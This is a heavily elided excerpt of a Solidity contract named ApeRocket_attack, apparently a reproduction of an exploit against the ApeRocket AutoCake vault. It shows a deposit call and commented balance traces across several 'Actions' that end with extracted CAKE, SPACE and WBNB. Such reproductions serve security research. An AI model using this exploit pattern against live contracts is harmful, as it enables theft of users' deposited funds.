...
contract ApeRocket_attack {
    ...
    function attack() public {
        ...
        // Action 1: Deposit:  CAKE --> Share, Principle

        // WBNB Balance: 0 CAKE Balance: 1615000 SPACE Balance: 0 Share: 0  Principle: 0



        // str1 = AutoCakeSummary();
        // uint ShareGot = AutoCake.sharesOf(address(this));
        // uint PrincipleGot = AutoCake.principalOf(address(this));

        AutoCake.deposit(509143 * 1e18);  // x1

        // ShareGot = (AutoCake.sharesOf(address(this)) - ShareGot ) / 1e18;
        // PrincipleGot = (AutoCake.principalOf(address(this)) - PrincipleGot ) / 1e18;
        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(ShareGot), uint2str(PrincipleGot))));
        ...
        // WBNB Balance: 0 CAKE Balance: 1105857 SPACE Balance: 0 Share: 494655 Principle: 509143
        ...
        // WBNB Balance: 0 CAKE Balance: 0 SPACE Balance: 0 Share: 494655 Principle: 509143
...
// 494655
        ...
        // Action 4: Share, (Principle) --> CAKE, SPACE

        // str1 = AutoCakeSummaryUserInfo();
        ...
        // str2 = AutoCakeSummaryUserInfo();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(CAKEgot), uint2str(SPACEgot))));

        // AutoCake CakeBalance: 0 AutoCake Staked: 1617545 totalShares: 497128 
        // user shares: 494655 user principle: 509143 
        // AutoCake CakeBalance: 0 AutoCake Staked: 517190 totalShares: 158950 
        // user shares: 156477 user principle: 509143 
        // 770248 
        // 504978


        // WBNB Balance: 0 CAKE Balance: 770248 SPACE Balance: 504978 Share: 156477 Principle: 509143


        // Action 5: Share, Principle -> CAKE, SPACE
        ...
        // user shares: 0 user principle: 0 
        // 506597 
        // 3834
        ...
        // WBNB Balance: 0 CAKE Balance: 1276845 SPACE Balance: 508813 Share: 0 Principle: 0
        ...
        // WBNB Balance: 16857 CAKE Balance: 1276845 SPACE Balance: 4816 Share: 0
